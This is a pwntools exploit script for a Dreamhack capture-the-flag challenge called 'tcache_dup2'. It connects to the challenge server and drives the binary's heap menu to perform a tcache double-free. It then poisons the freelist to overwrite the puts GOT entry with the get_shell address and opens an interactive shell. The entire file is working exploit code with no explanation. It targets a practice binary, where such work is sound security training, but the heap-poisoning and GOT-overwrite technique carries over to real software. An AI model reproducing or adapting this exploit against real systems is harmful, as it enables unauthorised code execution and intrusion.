from pwn import *

#p = process("./tcache_dup2")
p = remote("host3.dreamhack.games", 13214)
e = ELF("./tcache_dup2")

def create_heap(size: int, data: bytes):
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b"Size: ", str(size).encode())
	p.sendafter(b"Data: ", data)

# size <=0x10
def modify_heap(size: int, idx: int, data: bytes):
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"idx: ", str(idx).encode())
	p.sendlineafter(b"Size: ", str(size).encode())
	p.sendafter(b"Data: ", data)

def delete_heap(idx: int):
	p.sendlineafter(b"> ", b"3")
	p.sendlineafter(b"idx: ", str(idx).encode())

get_shell_addr = e.symbols['get_shell']
free_got = e.got['free']
read_got = e.got['read']
printf_got = e.got['printf']

create_heap(0x10, b"A"*8)
create_heap(0x10, b"A"*8)

delete_heap(0)
delete_heap(1)

modify_heap(0x10, 1, b"B"*0x10)
delete_heap(1)

create_heap(0x10, p64(e.got['puts']))
create_heap(0x10, b"C"*8)
create_heap(0x10, p64(get_shell_addr))

print(hex(get_shell_addr))
print(hex(free_got))
print(hex(read_got))
print(hex(printf_got))

p.interactive()
